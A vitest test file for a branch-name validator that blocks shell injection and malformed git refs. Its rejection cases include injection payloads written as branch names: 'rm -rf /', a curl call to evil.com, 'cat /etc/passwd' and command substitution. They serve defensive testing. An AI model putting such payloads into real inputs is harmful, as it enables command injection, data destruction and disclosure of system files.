/**
 * Tests for BranchNameValidator
 *
 * Verifies that branch name validation rejects shell metacharacters and
 * dangerous git ref patterns while permitting all valid branch name formats.
 *
 * @see Issue #2491 - Fix shell injection via unsanitized branch names
 */

import { describe, it, expect } from "vitest";
import { validateBranchName, assertValidBranchName } from "../../src/utils/BranchNameValidator";

describe("BranchNameValidator", () => {
  describe("validateBranchName — valid patterns", () => {
    const valid = [
      "main",
      "feat/42-dark-mode",
      "fix/upgrade-sdk",
      "epic/2491",
      "feature/add-oauth",
      "docs/update-readme",
      "chore/cleanup",
      "release/1.2.3",
      "feat/JIRA-123-my-feature",
      "hotfix/critical_bug",
      "user/mark/feature",
      "v1.0.0",
      "a",
      "A",
      "0",
    ];

    for (const name of valid) {
      it(`allows "${name}"`, () => {
        expect(validateBranchName(name).valid).toBe(true);
      });
    }
  });

  describe("validateBranchName — shell injection payloads", () => {
    const dangerous = [
      // Command substitution
      ["feat/$(whoami)", "$ or ()"],
      ["feat/`id`", "backtick"],
      ['feat/"test"', "double quote"],
      // Command chaining
      ["feat/;rm -rf /", "semicolon"],
      ["feat/&&curl evil.com", "double ampersand"],
      ["feat/||echo hi", "double pipe"],
      ["feat/|cat /etc/passwd", "pipe"],
      // Redirects
      ["feat/>output", "redirect"],
      ["feat/<input", "redirect"],
      // Spaces / newlines
      ["feat/my branch", "space"],
      ["feat/my\tbranch", "tab"],
      ["feat/my\nbranch", "newline"],
      // Other special chars
      ["feat/!bang", "exclamation"],
      ["feat/#hash", "hash"],
      ["feat/%percent", "percent"],
      ["feat/^caret", "caret"],
      ["feat/*glob", "asterisk"],
      ["feat/?question", "question mark"],
      ["feat/[bracket]", "bracket"],
      ["feat/{brace}", "brace"],
      ["feat/(paren)", "paren"],
      ["feat/'quote", "single quote"],
      ["feat/\\backslash", "backslash"],
      ["feat/~tilde", "tilde"],
    ];

    for (const [name, desc] of dangerous) {
      it(`rejects "${name}" (${desc})`, () => {
        expect(validateBranchName(name).valid).toBe(false);
      });
    }
  });

  describe("validateBranchName — dangerous git ref patterns", () => {
    it("rejects @{ reflog syntax", () => {
      expect(validateBranchName("feat/@{-1}").valid).toBe(false);
    });

    it("rejects .. range/traversal", () => {
      expect(validateBranchName("main..feature").valid).toBe(false);
    });

    it("rejects /. segment starting with dot", () => {
      expect(validateBranchName("feat/.hidden").valid).toBe(false);
    });

    it("rejects .lock suffix", () => {
      expect(validateBranchName("feat/test.lock").valid).toBe(false);
    });

    it("rejects branch name starting with dash", () => {
      expect(validateBranchName("-feat/test").valid).toBe(false);
    });

    it("rejects trailing slash", () => {
      expect(validateBranchName("feat/").valid).toBe(false);
    });

    it("rejects trailing dot", () => {
      expect(validateBranchName("feat/test.").valid).toBe(false);
    });

    it("rejects double slash", () => {
      expect(validateBranchName("feat//double").valid).toBe(false);
    });
  });

  describe("validateBranchName — edge cases", () => {
    it("rejects empty string", () => {
      const result = validateBranchName("");
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/empty/i);
    });

    it("rejects string over 250 characters", () => {
      const long = "feat/" + "a".repeat(250);
      const result = validateBranchName(long);
      expect(result.valid).toBe(false);
      expect(result.reason).toMatch(/length/i);
    });

    it("allows string exactly 250 characters", () => {
      const name = "feat/" + "a".repeat(245);
      expect(name.length).toBe(250);
      expect(validateBranchName(name).valid).toBe(true);
    });

    it("rejects unicode characters", () => {
      expect(validateBranchName("feat/écriture").valid).toBe(false);
    });

    it("rejects null bytes", () => {
      expect(validateBranchName("feat/\x00null").valid).toBe(false);
    });

    it("includes offending character in error reason", () => {
      const result = validateBranchName("feat/$(cmd)");
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
    });
  });

  describe("assertValidBranchName", () => {
    it("does not throw for valid branch names", () => {
      expect(() => assertValidBranchName("feat/42-dark-mode")).not.toThrow();
    });

    it("throws for invalid branch names", () => {
      expect(() => assertValidBranchName("feat/$(whoami)")).toThrow(/invalid branch name/i);
    });

    it("includes context in error message when provided", () => {
      expect(() => assertValidBranchName("feat/;rm", "baseBranch")).toThrow(/baseBranch/);
    });
  });
});
